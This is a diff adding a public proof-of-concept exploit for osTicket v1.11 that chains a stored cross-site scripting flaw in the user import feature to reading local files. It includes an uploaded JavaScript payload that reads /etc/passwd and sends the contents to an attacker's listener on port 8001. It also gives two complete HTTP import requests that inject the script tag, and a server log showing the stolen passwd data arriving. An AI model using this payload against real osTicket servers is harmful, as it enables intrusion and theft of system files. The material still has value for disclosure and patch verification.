@@ -1,0 +1,107 @@
+# Exploit Title: osTicket v1.11 - Cross-Site Scripting to Local File
+Inclusion
+# Date: 09.04.2019
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS) @ehakkus
+# Contact: https://pentest.com.tr
+# Vendor Homepage: https://osticket.com
+# Software Link: https://github.com/osTicket/osTicket
+# References: https://github.com/osTicket/osTicket/pull/4869
+#             https://pentest.com.tr/exploits/osTicket-v1-11-XSS-to-LFI.html
+# Version: v1.11
+# Category: Webapps
+# Tested on: XAMPP for Linux
+# Description: This is exploit proof of concept as XSS attempt can
+# lead to an LFI (Local File Inclusion) attack at osTicket.
+##################################################################
+# PoC
+
+# There are two different XSS vulnerabilities in the "Import"
+field on the Agent Panel - User Directory field. This vulnerability
+causes a different vulnerability. The attacker can run the malicious
+JS file that he uploads in the XSS vulnerability. Uploaded JS files
+can be called clear text. Therefore, attackers do not have to use
+a different server to perform an attack. Then it is possible to
+create "Local File Inclusion" vulnerability too.
+
+The attacker can upload a JS file as follows.
+------------------------------------------------------------------
+
+function readTextFile(file)
+{
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                var allText = rawFile.responseText;
+                allText.src = 'http://localhost:8001' +
+rawFile.responseText;
+                document.body.appendChild(allText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+
+readTextFile("/etc/passwd");
+
+------------------------------------------------------------------
+
+# Smilar JS File Link;
+
+/upload/file.php?key=y3cxcoxqv8r3miqczzj5ar8rhm1bhcbm
+&expires=1554854400&signature=be5cea87c37d7971e0c54164090a391066ecbaca&id=36"
+
+After this process, we can run the JS file in XSS vulnerability.
+
+
+# Our First Request for XSS to LFI;
+------------------------------------------------------------------
+
+POST /upload/scp/users.php?do=import-users
+Host: localhost
+Content-Type: multipart/form-data; boundary=---------------------------[]
+
+
+-----------------------------[]
+Content-Disposition: form-data; name="__CSRFToken__"
+
+8f6f85b8d76218112a53f909692f3c4ae7768b39
+-----------------------------[]
+Content-Disposition: form-data; name="pasted"
+
+
+-----------------------------[]
+Content-Disposition: form-data; name="import"; filename="users-20190408.csv"
+Content-Type: text/csv
+
+<script src="
+http://localhost/4/osTicket-v1.11/upload/file.php?key=y3cxcoxqv8r3miqczzj5ar8rhm1bhcbm&expires=1554854400&signature=be5cea87c37d7971e0c54164090a391066ecbaca&id=36
+"></script>
+
+-----------------------------[]--
+
+
+
+
+# Our Second Request for XSS to LFI;
+------------------------------------------------------------------
+POST /upload/scp/ajax.php/users/import HTTP/1.1
+Host: localhost
+
+__CSRFToken__=8f6f85b8d76218112a53f909692f3c4ae7768b39&pasted=%3Cscript+src%3D%22http%3A%2F%2Flocalhost%2F4%2FosTicket-v1.11%2Fupload%2Ffile.php%3Fkey%3Dy3cxcoxqv8r3miqczzj5ar8rhm1bhcbm%26expires%3D1554854400%26signature%3Dbe5cea87c37d7971e0c54164090a391066ecbaca%26id%3D36%22%3E%3C%2Fscript%3E&undefined=Import+Users
+------------------------------------------------------------------
+
+
+# After sending XSS requests,
+# When the attacker listens to port 8001, he/she will receive a request as
+follows.
+
+root@AkkuS:~# python -m SimpleHTTPServer 8001
+Serving HTTP on 0.0.0.0 port 8001 ...
+127.0.0.1 - - [09/Apr/2019 11:54:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [09/Apr/2019 11:54:42] "GET
+/root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin...[More]
